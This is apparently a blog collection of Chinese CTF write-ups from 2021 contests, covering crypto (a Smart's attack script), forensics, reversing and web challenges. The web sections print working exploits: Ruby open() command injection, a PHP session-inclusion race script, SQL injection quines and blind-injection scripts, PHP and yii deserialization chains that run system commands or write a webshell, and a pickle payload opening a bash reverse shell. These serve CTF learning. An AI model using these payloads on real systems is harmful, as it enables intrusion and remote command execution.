EllipticCurve(GF(p),[A,B])P=E(550637390822762334900354060650869238926454800955557622817950, 700751312208881169841494663466728684704743091638451132521079)Q=E(1152079922659509908913443110457333432642379532625238229329830 ,819973744403969324837069647827669815566569448190043645544592)primes = [2,5,7,27,212117,302426983]dlogs = []for fac in primes: t = int(int(E.order()) / int(fac)) dlog = discrete_log(t*Q,t*P,operation=&quot;+&quot;) dlogs += [dlog] print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog))#16093767336603949 可以发现曲线的阶和模数是相同的,采用smart’s attackhttps://wstein.org/edu/2010/414/projects/novotney.pdf paper有代码。 def HenselLift(P,p,prec): E = P.curve() Eq = E.change_ring(QQ) Ep = Eq.change_ring(Qp(p,prec)) x_P,y_P = P.xy() x_lift = ZZ(x_P) y_lift = ZZ(y_P) x, y, a1, a2, a3, a4, a6 = var('x,y,a1,a2,a3,a4,a6') f(a1,a2,a3,a4,a6,x,y) = y^2 + a1*x*y + a3*y - x^3 - a2*x^2 - a4*x - a6 g(y) = f(ZZ(Eq.a1()),ZZ(Eq.a2()),ZZ(Eq.a3()),ZZ(Eq.a4()),ZZ(Eq.a6()),ZZ(x_P),y) gDiff = g.diff() for i in range(1,prec): uInv = ZZ(gDiff(y=y_lift)) u = uInv.inverse_mod(p^i) y_lift = y_lift - u*g(y_lift) y_lift = ZZ(Mod(y_lift,p^(i+1))) y_lift = y_lift+O(p^prec) return Ep([x_lift,y_lift])def SmartAttack(P,Q,p,prec): E = P.curve() Eqq = E.change_ring(QQ) Eqp = Eqq.change_ring(Qp(p,prec)) P_Qp = HenselLift(P,p,prec) Q_Qp = HenselLift(Q,p,prec) p_times_P = p*P_Qp p_times_Q=p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P k = Mod(k,p) return kp = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1bA = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2E = EllipticCurve(GF(p),[A,B])P=E(10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861 , 8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610)Q=E(964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927 , 5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537)SmartAttack(P,Q,p,8) Misc签到题flag{welcometo5space} alpha10附件得到一个data文件，用foremost分解得到两张图片。00001404.jpg和00001537.png 考虑进行盲水印 命令：python bwmforpy3.py decode 00001404.jpg 00001537.png flag.png 得到：image&lt;00001404.jpg&gt; + image(encoded)&lt;00001537.png&gt; -&gt; watermark&lt;flag.png&gt; 解得图片 异或一下通过肉眼观察得到flag（建议近视眼摘眼镜观察最佳） flag{XqAe3QzK2ehD5fWv8jfBitPqHUw0} （为赛后复现，不一定准确，比赛的时候简单试了几次看起来相似的字母就出了。） WebPNG图片转换器考点：Ruby open rce 文章：https://blog.heroku.com/identifying-ruby-ftp-cve 文章中提供了一种命令执行的方式 /convert路由刚好满足了条件，直接利用即可。不过要注意的是要以.png结尾，这里可以直接把内容输入到aatao.png；不能用 / 和 .. 不过可以用Linux下的环境变量构造出来 读取根目录文件内容|ls+`echo+$PATH|cut+-c+1`+&gt;aatao.png接着读取aatao.png内容，base64解码即可 接着读取/FLA9_KywXAv78LbopbpBDuWsm的内容 查看aatao.png的内容 EasyCleanup考点：session文件包含 日常考点，直接上脚本 import ioimport requestsimport threadingsess_id = 'Atao'def write(session): while True: f = io.BytesIO(b'a' * 1024 * 128) session.post(url='http://114.115.134.72:32770/', data={'PHP_SESSION_UPLOAD_PROGRESS': 'aaaaasdasdasd&lt;?php system(&quot;cat /flag_is_here_not_are_but_you_find&quot;)?&gt;'}, files={'file': ('atao.txt',f)}, cookies={'PHPSESSID': sess_id} )if __name__==&quot;__main__&quot;: event = threading.Event() session = requests.session() for i in range(1,80): threading.Thread(target=write,args=(session,)).start() 接着访问：http://114.115.134.72:32770/?file=/tmp/sess_Atao即可 yet_another_mysql_injection考点：构造一个select返回的内容与$_POST[‘password’]相同即可 参考文章：https://www.shysecurity.com/post/20140705-SQLi-Quine 这里俺是模仿出来的文章的Payload写的 'union/**/select/**/REPLACE(REPLACE('&quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#',CHAR(34),CHAR(39)),CHAR(94),'&quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#')AS/**/atao# 主要是利用REPLACE替换函数将内容换成来完成**$_POST[‘password’]==$row[‘password’]** &quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#第一次REPLACE'union/**/select/**/REPLACE(REPLACE('^',CHAR(34),CHAR(39)),CHAR(94),'^')AS/**/atao#第二次REPLACE'union/**/select/**/REPLACE(REPLACE('&quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#',CHAR(34),CHAR(39)),CHAR(94),'&quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#')AS/**/atao# WebFTP找源码：https://github.com/wifeat/WebFTP flag在phpinfo中有，感觉是非预期了 pklovecloud考点：构造POP链 &lt;?phpclass acp{ protected $cinder; public $neutron; public $nova; function __construct($cinder){ $this-&gt;nova = &amp;$this-&gt;neutron; $this-&gt;cinder = $cinder; }}class ace{ public $filename = &quot;flag.php&quot;; public $openstack; public $docker; function __construct($docker){ $this-&gt;docker = $docker; }}echo urlencode(serialize(new acp(new ace(serialize(new acp(&quot;&quot;)))))); 访问：view-source:http://122.112.141.64:45852/?pks=O%3A3%3A”acp”%3A3%3A{s%3A9%3A”*cinder”%3BO%3A3%3A”ace”%3A3%3A{s%3A8%3A”filename”%3Bs%3A8%3A”flag.php”%3Bs%3A9%3A”openstack”%3BN%3Bs%3A6%3A”docker”%3Bs%3A68%3A”O%3A3%3A”acp”%3A3%3A{s%3A9%3A”*cinder”%3Bs%3A0%3A””%3Bs%3A7%3A”neutron”%3BN%3Bs%3A4%3A”nova”%3BR%3A3%3B}”%3B}s%3A7%3A”neutron”%3BN%3Bs%3A4%3A”nova”%3BR%3A6%3B}","link":"/posts/56002/"},{"title":"2021网刃杯WP","text":"2021网刃杯WP 成绩 第二名 MISC部分气死我了气死我了气死我了私钥头错了一直卡着，过了就好说多了。注：encrypted ad1是赛后出的 签到解压得到flag.txt和一段密文Flag.txt是0宽勾选BCDE(vim查看就可以看到要勾选这几个)、得到hintmyself居然是flag.txt的md5，我麻了得到key：f71b6b842d2f0760c3ef74911ffc7fdb最后测试rabbit，得到flag flag{WelY0me_2_bOl3an} baby-usb键盘流量，完全按这篇即可http://www.ga1axy.top/index.php/archives/22/脚本直接用，步骤直接仿得到 output :CT[DEL]ONH[DEL]GRATUE[DEL]LATIOKE[DEL][DEL]NSONFINY[DEL]DINGMEBUTIWII[DEL]LLNS[DEL]OTTELLYOUWHERETQA[DEL][DEL]HEPZ[DEL]ASSWORDWS[DEL][DEL]OX[DEL]FWE[DEL]OD[DEL]RDDOC[DEL]CUMENTISGOARFV[DEL][DEL][DEL]NDFINDITAGAIN 发现删除的就是KEY，The key is qazwsxedcrfv 即可打开word flag{685b42b0-da3d-47f4-a76c-0f3d07ea962a} Mspaint上vol，imageinfo显示Win7，pslist发现用了cmd、画图、ie，cmd说他喜欢把图片截图下来，因此filescan |grep ‘png’导出，发现文件只有一个hack然后iehistory发现他访问了一个百度云盘链接，尝试用hack，成功。密码即hack。下载下来附件，居然有密码。因此查看内存图，方法如此链接最后一个https://blog.csdn.net/qq_42880719/article/details/117304586因为我怕看错（主要是我眼比较瞎），所以我用zip爆破软件，用户自定义爆我选择了8%R~sSA52!iqp，长度8位 解压之后，发现是python写的于是直接逆 参考：https://blog.csdn.net/weixin_44362969/article/details/105616531第一步：python pyinstxtravtor.py xxxxx.exe第二步：得到一个文件夹其中有一个struct 跟 xxxxx（都没有后缀名）十六进制查看struct，xxxxx。会发现xxxxx比struct少了一行这时将struct的那一行复制给xxxxx，然后xxxxx保存后添加后缀xxxxx.pyc第三步：使用uncompyle6（我是kali）uncompyle6 xxxxx.pyc &gt; xxxxx.py 得到 key = 'xxxxxxxxxxxxxxx'flag = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'data = ''for i in range(0, len(flag)): data += hex(ord(flag[i]) ^ ord(key[(i % 15)]))[2:].zfill(2)else: print(data.upper()) data = '12045014240343684450506E5E1E1C165D045E6B52113C5951006F091E4F4C0C54426A52466A165B0122' 然后现在需要找key，但是我们知道flag{开头，因此可以反推出key前5位 f = [18,4,80,20,36]keys = 'flag{'for i in range(len(f)): print(chr(f[i]^ord(keys[i])),end='') 得到th1s_，直接winhex搜key keys = 'th1s_1s_th3_k3y's = '12045014240343684450506E5E1E1C165D045E6B52113C5951006F091E4F4C0C54426A52466A165B0122'for i in range(len(s)//2): print(chr(int(s[i*2:i*2+2],16)^ord(keys[(i % 15)])),end='') 其实这里预期搜key应该是内存取证用screenshot指令，可以看到key flag{20708c15-eb55-4cbc-930b-68de15c55b32} encrypted ad1积累了，学到了。是我傻了下载下来文件名为ZW5jcnlwdA，解码之后得到encrypt结合题目为ad1，所以应该是一个ad1的磁盘文件，并且加了密查看文件尾，能够看到一串base 但很明显，这里转过来了，因此复制出来脚本转一下 s = '''==gqxEjgKtDzKI/D1ajBJIcxvLrijkUVc28YA3sTmY8Ac+r3fiDWl80a44vbCwhxf8xwibLU6V1Ek31d7Q8W78VcYS+8Za1+IhG3hQ3NiLkbmqXUzb2M3Ou715G1xhX3lvi7Yj2CyTz68WQKzcoTvv4pZU+ISdQdNcoJEQSJhocwQAYgCUowrcMWAytwCo05H/yUQGTYA7acF8stHPUPScAoWdL/NW5FqASDAJRN7cM/3kR9GWzTw4WImS36/C/94OBX1jJQVssAnd1NPD2F9EcX0GS2L9GIzdPyL5kZgZ8I2ShrzGo//HX5G+IqTcKRqsB5TAOddb4lTp/r6XowLqAY9IZJAGoAR9kcrKNzwsJXn6HZN29ilFTCVnwRqDpDulps/c2fyInUqsHzZxctm5iiCZRiy1XjcyLrJtRKbTvyfXY1K7D1Q+dgeKbzHMihscHQiBL+WMG/3Drwsz/vQiXdS7QCpNU230WH0HXZiqItJOfPLrpR5L7gVPjDC1WRlB2J169jNBIABGoAFCd8AqBrKhkTxfHOGZOugFK5RXT2+9S1rZEGMg5bxtBgNzeFo9pq2RtXAeWgXcJXSUC9MFnY5fbuToUSOlvsYr4CKk99EFiX7S1YU+EohUTs6hRIXbt6EdzkVQsZbDkgLIrjiOyRXO20Quq/a09PqC/ZqXz+mztjgRvlPYj4fgNABGoAxIhFqK1LV4121nsmnKfgPLUTEZk1bG05dULkA86/AdRgbJWJ+38/4Z+KGRT8Kqu2dQ4f47fSp+OQL76S4ur0Vmk2vXHOZqXuZIvBIV/5ZmO8uC5sdyT+Cb+319ct8Twfc9lACABWXDG5kijTdzytbabEFmONqNHlOutjTFjGmWOABGoABFWJTb6In8Or2leNITMvoTZeew52vTTGfAWmLeNfHh+qgRGt6QmpHt8+YqUyQr6HMFq5bNIHHeLDiPc6R6/eaiCZ2VYYf8G6G9vfzZLyb4JD8WHP3q4+gPlg+n1xQCsv+t5cGuhLJhPoD69aIgB0rxiEDzV6zG3SqziFZXjYtyXYpZ2oFEWTbXBMhnTucJXTRrxktXXxP3e1cRCbX0VZXxpZeLqd62O9s5QnfJJxSsHOaR8YZ2ONVLtotpFB6/WDX392066TjppXfKSRqD7QMDNO0Xd0nvRYfvAW2T9jsEPxPx2ZCV+JPYu2SKneIYz+QYYcaPA1zaE+aypIzG6SfCQABIoABAQADIQdDBG79zq8d0RhLOCxVaKSLcSQCTRtETiTLUYUyYk0WRs709wlDEsm0VsQI+X7HDSxaQJeIBWzZUaAs0ALuIqW4kw5Ny6ZSN1n52HJQMEJV50RwrFxjgH5DfLGa7P2nQJWivL02fgBeaGtjkSi86zoPwOmmYnocbP3Ad0tbQtXECvOEUiz8TsbgalR5bkKpSTmR98NCO9SKAVUN5IM8uOnl2ct/37JLMYa+fGZQ3I4ZHZmJN8vOANsnCNs68+QVWtRIo4fAp2QqHpmn/Is8OeOcwEJkwA3HJvJbHLIw0vleLaqwCP9UfXGHlBbknjJ4Deqb5RqnHQsN383ey+IADewAEQACKAABIApEIIM'''print(s[::-1]) 得到一个base串，看了之后应该类似于RSA之类的。然后打开搞磁盘文件常用的FTK，发现FTK能解密，于是为了研究，主动去生成了一个ad1 然后反正就生成一个ad1，记得生成的文件给他加个密注意到正确的文件头应该是41 44于是将题目的文件尾base删掉、文件头00 00 改成 41 44然后FTK里点击decrypt ad1选项可以注意到能使用证书来解密，于是尝试。然鹅比赛期间我一直没添加—–BEGIN RSA PRIVATE KEY—–头和—–END RSA PRIVATE KEY—–尾，一直是加的—–BEGIN PRIVATE KEY—–，导致没解出来，我麻了如图，然后保存为pfx文件。解密之后，用FTK挂载此文件这里我挂载到了H盘直接想到时间来作为2进制，2进制转ascii于是写个脚本转换 import oslist = ['']*392i = 0for j in range(392): list[j] = os.path.getmtime('H:\\\\'+str(j)+'.crypto')print(list)flag = ''for i in range(392): if(str(list[i]) == '1629859254.863367'): flag += '0' else: flag += '1'print(flag)tmp = ''for k in range(len(flag)): tmp += flag[k] if len(tmp) == 8: print(chr(int(tmp,2)),end='') tmp = '' 得到 You are so cool!!! this is your key: 6a90383cd08c 然后这392个文件是crypto文件 用这个，然后用这个key来解0.crypto和1.crypto(因为这两个时间不一样) flag{ba40c40b-1356-4fc6-8cc7-6a90383cd08c} 协议藏在s7里的秘密下载下来的流量包是部分损坏的，使用网站在线修复http://f00l.de/hacking/pcapfix.php然后打开流量包，发现有png，但是就如此提取，必定会混入奇奇怪怪的东西于是观察之后，用tshark来提取 tshark -r Ks3qlAF1bTuysqpJ.pcap -T fields -e s7comm.resp.data -Y “s7comm.param.func == 0x05 and ip.src==192.168.139.1” &gt; png.txt 得到16进制数用010打开，将十六进制数复制进去，即可得到图片，但是明显发现高度不对，因此修改任意高度，得到flag flag{FSfeQefjg} 老练的黑客和之前工控的那道，不能说是完全相似，只能说是一模一样类原题博客&amp;&amp;赶快关注工控大佬的博客根据此博客，能直接找到错误的值第1199流找到22b8然后根据观察前面的流，发现read的值是跟在过滤之后的第2个流然后尝试理解提交 flag{22b81194} Reversereverse1SM3 然后把下图的复制进脚本 百度一个国密SM3脚本 from math import ceil################################################################################ 国产SM3加密算法###############################################################################IV = &quot;7380166f 4914b2b9 172442d7 da8a0600 a96f30bc 163138aa e38dee4d b0fb0e4e&quot;IV = int(IV.replace(&quot; &quot;, &quot;&quot;), 16)a = []for i in range(0, 8): a.append(0) a[i] = (IV &gt;&gt; ((7 - i) * 32)) &amp; 0xFFFFFFFFIV = adef out_hex(list1): for i in list1: print(&quot;%08x&quot; % i) print(&quot;\\n&quot;)def rotate_left(a, k): k = k % 32 return ((a &lt;&lt; k) &amp; 0xFFFFFFFF) | ((a &amp; 0xFFFFFFFF) &gt;&gt; (32 - k))T_j = []for i in range(0, 16): T_j.append(0) T_j[i] = 0x79cc4519for i in range(16, 64): T_j.append(0) T_j[i] = 0x7a879d8adef FF_j(X, Y, Z, j): if 0 &lt;= j and j &lt; 16: ret = X ^ Y ^ Z elif 16 &lt;= j and j &lt; 64: ret = (X &amp; Y) | (X &amp; Z) | (Y &amp; Z) return retdef GG_j(X, Y, Z, j): if 0 &lt;= j and j &lt; 16: ret = X ^ Y ^ Z elif 16 &lt;= j and j &lt; 64: # ret = (X | Y) &amp; ((2 ** 32 - 1 - X) | Z) ret = (X &amp; Y) | ((~ X) &amp; Z) return retdef P_0(X): return X ^ (rotate_left(X, 9)) ^ (rotate_left(X, 17))def P_1(X): return X ^ (rotate_left(X, 15)) ^ (rotate_left(X, 23))def CF(V_i, B_i): W = [] for i in range(16): weight = 0x1000000 data = 0 for k in range(i * 4, (i + 1) * 4): data = data + B_i[k] * weight weight = int(weight / 0x100) W.append(data) for j in range(16, 68): W.append(0) W[j] = P_1(W[j - 16] ^ W[j - 9] ^ (rotate_left(W[j - 3], 15))) ^ (rotate_left(W[j - 13], 7)) ^ W[j - 6] str1 = &quot;%08x&quot; % W[j] W_1 = [] for j in range(0, 64): W_1.append(0) W_1[j] = W[j] ^ W[j + 4] str1 = &quot;%08x&quot; % W_1[j] A, B, C, D, E, F, G, H = V_i &quot;&quot;&quot; print &quot;00&quot;, out_hex([A, B, C, D, E, F, G, H]) &quot;&quot;&quot; for j in range(0, 64): SS1 = rotate_left(((rotate_left(A, 12)) + E + (rotate_left(T_j[j], j))) &amp; 0xFFFFFFFF, 7) SS2 = SS1 ^ (rotate_left(A, 12)) TT1 = (FF_j(A, B, C, j) + D + SS2 + W_1[j]) &amp; 0xFFFFFFFF TT2 = (GG_j(E, F, G, j) + H + SS1 + W[j]) &amp; 0xFFFFFFFF D = C C = rotate_left(B, 9) B = A A = TT1 H = G G = rotate_left(F, 19) F = E E = P_0(TT2) A = A &amp; 0xFFFFFFFF B = B &amp; 0xFFFFFFFF C = C &amp; 0xFFFFFFFF D = D &amp; 0xFFFFFFFF E = E &amp; 0xFFFFFFFF F = F &amp; 0xFFFFFFFF G = G &amp; 0xFFFFFFFF H = H &amp; 0xFFFFFFFF V_i_1 = [] V_i_1.append(A ^ V_i[0]) V_i_1.append(B ^ V_i[1]) V_i_1.append(C ^ V_i[2]) V_i_1.append(D ^ V_i[3]) V_i_1.append(E ^ V_i[4]) V_i_1.append(F ^ V_i[5]) V_i_1.append(G ^ V_i[6]) V_i_1.append(H ^ V_i[7]) return V_i_1def hash_msg(msg): # print(msg) len1 = len(msg) reserve1 = len1 % 64 msg.append(0x80) reserve1 = reserve1 + 1 # 56-64, add 64 byte range_end = 56 if reserve1 &gt; range_end: range_end = range_end + 64 for i in range(reserve1, range_end): msg.append(0x00) bit_length = (len1) * 8 bit_length_str = [bit_length % 0x100] for i in range(7): bit_length = int(bit_length / 0x100) bit_length_str.append(bit_length % 0x100) for i in range(8): msg.append(bit_length_str[7 - i]) # print(msg) group_count = round(len(msg) / 64) B = [] for i in range(0, group_count): B.append(msg[i * 64:(i + 1) * 64]) V = [] V.append(IV) for i in range(0, group_count): V.append(CF(V[i], B[i])) y = V[i + 1] result = &quot;&quot; for i in y: result = '%s%08x' % (result, i) return resultdef str2byte(msg): # 字符串转换成byte数组 ml = len(msg) msg_byte = [] msg_bytearray = msg # 如果加密对象是字符串，则在此对msg做encode()编码即可，否则不编码 for i in range(ml): msg_byte.append(msg_bytearray[i]) return msg_bytedef byte2str(msg): # byte数组转字符串 ml = len(msg) str1 = b&quot;&quot; for i in range(ml): str1 += b'%c' % msg[i] return str1.decode('utf-8')def hex2byte(msg): # 16进制字符串转换成byte数组 ml = len(msg) if ml % 2 != 0: msg = '0' + msg ml = int(len(msg) / 2) msg_byte = [] for i in range(ml): msg_byte.append(int(msg[i * 2:i * 2 + 2], 16)) return msg_bytedef byte2hex(msg): # byte数组转换成16进制字符串 ml = len(msg) hexstr = &quot;&quot; for i in range(ml): hexstr = hexstr + ('%02x' % msg[i]) return hexstrdef KDF(Z, klen): # Z为16进制表示的比特串（str），klen为密钥长度（单位byte） klen = int(klen) ct = 0x00000001 rcnt = ceil(klen / 32) Zin = hex2byte(Z) Ha = &quot;&quot; for i in range(int(rcnt)): msg = Zin + hex2byte('%08x' % ct) # print(msg) Ha = Ha + hash_msg(msg) # print(Ha) ct += 1 return Ha[0: klen * 2]def sm3_hash(msg, Hexstr=0): &quot;&quot;&quot; 封装方法，外部调用 :param msg: 二进制流（如若需要传入字符串，则把str2byte方法里msg做encode()编码一下，否则不编码） :param Hexstr: 0 :return: 64位SM3加密结果 &quot;&quot;&quot; if (Hexstr): msg_byte = hex2byte(msg) else: msg_byte = str2byte(msg) return hash_msg(msg_byte)print('\\n')if __name__ == '__main__': enc=['6b8575c6092240cde08414dafd535bee','f0f659f2951290ad5e076b3fe5e70425','c1d6c663570de9fad13ddef955d8a02b','14c4e442fba6d820ea90ae73ed90ad83','25d997669868d0cf89782349256efb33','78b1ea6bb1ac10287864c8f52d2758b6','67d1259c26765356ddb58c6faf28080c','c1e14e0c86f55ba1d74b35b66f96ad36','3e4f3ee942d1a57182e24df201b7022b','c35557f7e5c389061fb2e2ffa1a644ad','15593844fae18fe1a25f3a9017c73810','c6c21ca591a63755fd77bf5c55a0238a','f90cb529875e83cc191c0e10ead6f73e','3ddbe25f9b183c3e2c33c3b1e501fcd8','30fdf04c347f1d4e335bda670d54eaaf','33feb100c8c7c3769af6e9d26486c646'] import string flag='' e='' map = string.printable for i in range(len(enc)): for k in map: flag=''+k if sm3_hash(bytes(str(flag).encode()))[:32]==enc[i]: print(flag) 倒数第5的flag = ‘’+k，每次输出一个，将将其填入，直到最后即可当最后填入wel30m_t0_sm3!!!此时输出空白，则此为key flag{g0042ye_t0_sm4} 2048小游戏一个不知道啥鬼游戏，找到有flag的逻辑有个不知道什么的运算。但是经过几次测试，发现分数越多，那个函数得到的值越小。，那就i慢慢凑出来，发现分数为0x2100时刚好满足条件，然后下面就是根据这个分数，异或一个固定值得到一个数，然后下面就是验证前四个数值，就是上面那个数的倒数，然后下面就是对0x2100%8+48，0x2100/8| 最后 flag{b0d800402} webez_sql和Inctf的Rssa其中的一个小点考点相同，直接改脚本即可 原文连接：https://www.yuque.com/docs/share/f2e36905-38ae-4c20-8749-5aba747e5b91?# #-- coding:UTF-8 --import requestsdef strtohex(s): ss = &quot;0x&quot; for i in s: ss += str(hex(ord(i))).replace(&quot;0x&quot;,'') return ssburp0_url = &quot;http://116.62.239.41:4323/&quot;burp0_headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}character = &quot;zsuaqwxcderfvbgtyhnmjuiklop0123456789.&quot;flag = &quot;&quot;for j in range(1,100): for i in character: if j &gt;= 1 and j &lt;=6 : payload = strtohex(flag + i + &quot;%&quot;) else: payload = strtohex(&quot;%&quot; + flag[-6:] + i + &quot;%&quot;) sql = &quot;1,2 as username from user where username=0x61646d696e and password like {} union select 1&quot;.format(payload) params = { &quot;sql1&quot;:&quot;%27&quot;, &quot;sql2&quot;:sql } res = requests.get(burp0_url, headers=burp0_headers,params=params) print i + &quot; : &quot; + res.text if &quot;nonono&quot; in res.text: print &quot;字符过长！！！&quot; exit(0) if &quot;nop&quot; in res.text: flag += i print flag break if i == &quot;.&quot;: print flag exit(0) flag为53a2d36d72760586dfc400e54b54564b ez_web考点：文件读取、Python反序列化 右键注释中获得&lt;!-- ?pic=1.jpg --&gt;，发现是一个任意文件读取，使用http://116.62.239.41:4322/?pic=/app/app.py读取源文件，源码如下 import pickleimport base64from flask import Flask, requestfrom flask import render_template,redirect,send_from_directoryimport osimport requestsimport randomfrom flask import send_fileapp = Flask(__name__)class User(): def __init__(self,name,age): self.name = name self.age = agedef check(s): if b'R' in s: return 0 return 1@app.route(&quot;/&quot;)def index(): try: user = base64.b64decode(request.cookies.get('user')) if check(user): user = pickle.loads(user) username = user[&quot;username&quot;] else: username = &quot;bad,bad,hacker&quot; except: username = &quot;CTFer&quot; pic = '{0}.jpg'.format(random.randint(1,7)) try: pic=request.args.get('pic') with open(pic, 'rb') as f: base64_data = base64.b64encode(f.read()) p = base64_data.decode() except: pic='{0}.jpg'.format(random.randint(1,7)) with open(pic, 'rb') as f: base64_data = base64.b64encode(f.read()) p = base64_data.decode() return render_template('index.html', uname=username, pic=p )if __name__ == &quot;__main__&quot;: app.run('0.0.0.0') 知道了是python的反序列化漏洞，这里直接用巅峰极客2021 opcode的Payload即可 import base64import pickletoolsa = b'''(cossystemS'bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;'o.'''a = pickletools.optimize(a)print(base64.b64encode(a)) 获得flagflag{a806de95e0fd1e1ba5de6ed1ef20adb2} ez_php构造POP链如下 &lt;?phpclass fz{ protected $v0id; function __construct( $v0id){ $this-&gt;v0id = $v0id; }}class v0id{ protected $xin; protected $name; protected $group; protected $url; function __construct($group, $name, $url,$xin){ $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $this-&gt;xin=$xin; }}class xin{ protected $logwriter; function __construct($writer){ $this-&gt;logwriter = $writer; }}class host{ protected $filename; protected $format; function __construct($filename, $format){ $this-&gt;filename = $filename; $this-&gt;format = $format; }}class yang{ protected $filters; protected $endl; function __construct($filters, $endl){ $this-&gt;filters = $filters; $this-&gt;endl = $endl; }}class c4t {};$a=new c4t();$b=new yang($a,&quot;&quot;);$c=new host(new v0id(&quot;/../../../../../var/www/html/atao.php&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;),$b);$d=new xin($c);$f=new v0id('&lt;?=`ls`;?&gt;','../../../../../../var/www/html',&quot;&quot;,$d);$g=new fz($f);echo urlencode(serialize($g)); 接着访问fffffffffffllllllllaaaag文件，下载下来 直接获得flagflag{v3rY_Ez_Php_P0p}","link":"/posts/1010/"},{"title":"2021第二届祥云杯WP","text":"2021第二届祥云杯WP n03tAck战队成员为各个大学的学生，部分战队成员不可能只以n03tAck身份参赛，所以成员作为自身学校的正常组队行为与n03tAck无任何关系，此WP由赛后各个成员汇集而成。 Webezyii考点：yii反序列化链子 相关利用的类都发出来了，感觉不像CMS的审计，更像是POP链的构造。 &lt;?phpnamespace Codeception\\Extension{ use Faker\\DefaultGenerator; use GuzzleHttp\\Psr7\\AppendStream; class RunProcess{ protected $output; private $processes = []; public function __construct(){ $this-&gt;processes[]=new DefaultGenerator(new AppendStream()); $this-&gt;output=new DefaultGenerator('atao'); } } echo base64_encode(serialize(new RunProcess()));}namespace Faker{ class DefaultGenerator{ protected $default; public function __construct($default = null) { $this-&gt;default = $default;}}}namespace GuzzleHttp\\Psr7{ use Faker\\DefaultGenerator; final class AppendStream{ private $streams = []; private $seekable = true; public function __construct(){ $this-&gt;streams[]=new CachingStream(); } } final class CachingStream{ private $remoteStream; public function __construct(){ $this-&gt;remoteStream=new DefaultGenerator(false); $this-&gt;stream=new PumpStream(); } } final class PumpStream{ private $source; private $size=-10; private $buffer; public function __construct(){ $this-&gt;buffer=new DefaultGenerator('j'); include(&quot;closure/autoload.php&quot;); $a = function(){system('cat /flag.txt');phpinfo(); }; $a = \\Opis\\Closure\\serialize($a); $b = unserialize($a); $this-&gt;source=$b; } }}#payload:TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjI6e3M6OToiACoAb3V0cHV0IjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjQ6ImF0YW8iO31zOjQzOiIAQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtPOjI4OiJHdXp6bGVIdHRwXFBzcjdcQXBwZW5kU3RyZWFtIjoyOntzOjM3OiIAR3V6emxlSHR0cFxQc3I3XEFwcGVuZFN0cmVhbQBzdHJlYW1zIjthOjE6e2k6MDtPOjI5OiJHdXp6bGVIdHRwXFBzcjdcQ2FjaGluZ1N0cmVhbSI6Mjp7czo0MzoiAEd1enpsZUh0dHBcUHNyN1xDYWNoaW5nU3RyZWFtAHJlbW90ZVN0cmVhbSI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7YjowO31zOjY6InN0cmVhbSI7TzoyNjoiR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0iOjM6e3M6MzQ6IgBHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbQBzb3VyY2UiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoyMDQ6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDk6ImZ1bmN0aW9uKCl7XHN5c3RlbSgnY2F0IC9mbGFnLnR4dCcpO1xwaHBpbmZvKCk7CX0iO3M6NToic2NvcGUiO3M6MjY6Ikd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtIjtzOjQ6InRoaXM